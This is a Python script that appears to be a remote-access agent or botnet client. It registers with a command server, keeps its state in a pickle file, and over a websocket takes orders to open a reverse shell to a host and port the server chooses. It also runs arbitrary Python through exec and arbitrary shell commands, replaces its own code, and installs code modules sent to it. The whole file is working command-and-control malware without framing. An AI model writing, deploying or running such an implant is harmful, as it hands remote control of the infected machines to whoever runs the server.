#!/usr/bin/env python3

import os
import subprocess
import pickle
import time
import sys
import json
import urllib.request, urllib.parse
import traceback
import socket
import asyncio

try:
	from websockets.asyncio.client import connect, ClientConnection
	from websockets.exceptions import ConnectionClosedError
except:
	subprocess.check_call([sys.executable, "-m", "pip", "install", "-U", "websockets"])
	os.execv(sys.executable, [sys.executable] + sys.argv)

script_path = os.path.abspath(__file__)
state_path = script_path + ".pkl"
ws: ClientConnection = None

# --- State ---
state = {
	"uid": None,
	"version": 1,
	"servers": ["127.0.0.1:8000"],
	"modules": {},
}

modules = {}

def load_state():
	global state
	if os.path.isfile(state_path):
		with open(state_path, "rb") as f:
			state = pickle.load(f)

def save_state():
	with open(state_path, "wb") as f:
		pickle.dump(state,f)

# --- Utility ---
async def log(data: dict=None, tags:list[str]=[]):
	o = {"event":"log", "tags": tags}
	if data != None:
		o["data"] = data
	await ws.send(json.dumps(o))

async def module_msg(module:str, data: dict):
	o = {"event":"module", "module": module, "data": data}
	await ws.send(json.dumps(o))

async def safe_call(callable) -> bool:
	try:
		if asyncio.iscoroutinefunction(callable):
			await callable()
		else:
			callable()
		return True
	except Exception as e:
		traceback.print_exc()
	
	return False

async def main():
	global ws
	while True:
		time.sleep(1)

		if not state["uid"]:
			for server in state["servers"]:
				try:
					with urllib.request.urlopen(f"http://{server}/machines/api/{state['version']}/register/") as response:
						if response.code != 200: continue
						state["uid"] = json.loads(response.read().decode())
						save_state()
					break
				except Exception:
					traceback.print_exc()
		
		for i in modules.values():
			if "onload" in i:
				await safe_call(i["onload"])
		
		for server in state["servers"]:
			try:
				async with connect(f"ws://{server}/machines/ws/{state['version']}/{state['uid']}") as websocket:
					ws = websocket
					print("Joined")
					for i in modules.values():
						if "onconnect" in i:
							await safe_call(i["onconnect"])
					# websocket.send()
					while True:
						try:
							text = await websocket.recv()
							data = json.loads(text)
							if data["event"] == "order":
								for c in data["orders"]:
									try:
										match c["type"]:
											case "shell":
												s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
												s.connect((c["host"],c["port"]))
												subprocess.Popen(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
											case "python":
												exec(c["code"])
											case "run":
												subprocess.Popen(c["code"],shell=True)
											case "update":
												with open(script_path, "w") as f:
													f.write(c["code"])
												os.execv(sys.executable, [sys.executable] + sys.argv)
											case "install_module":
												state["modules"][c["name"]] = {"code": c["code"]}
												exec(c["code"])
												if await safe_call(modules[c["name"]]["install"]):
													await websocket.send(json.dumps({"event":"module_installed", "name": c["name"]}))
													save_state()
													if "postinstall" in modules[c["name"]]: await safe_call(modules[c["name"]]["postinstall"])
											case "uninstall_module":
												if await safe_call(modules[c["name"]]["uninstall"]):
													if c["name"] in state["modules"]: del state["modules"][c["name"]]
													if c["name"] in modules: del modules[c["name"]]
													await websocket.send(json.dumps({"event":"module_uninstalled", "name": c["name"]}))
												save_state()
									except Exception:
										traceback.print_exc()
										await log(data={"event": "exception", "code": traceback.format_exc()}, tags=["fail","order","error"])
									else:
										await log(tags=["succes","order"])
						except ConnectionClosedError:
							break
						except Exception:
							traceback.print_exc()
					break
			except KeyboardInterrupt:
				break
			except Exception:
				traceback.print_exc()

	save_state()

if __name__ == "__main__":
	load_state()
	for i in state["modules"]:
		try:
			exec(state["modules"][i]["code"])
		except Exception:
			traceback.print_exc()
	asyncio.run(main())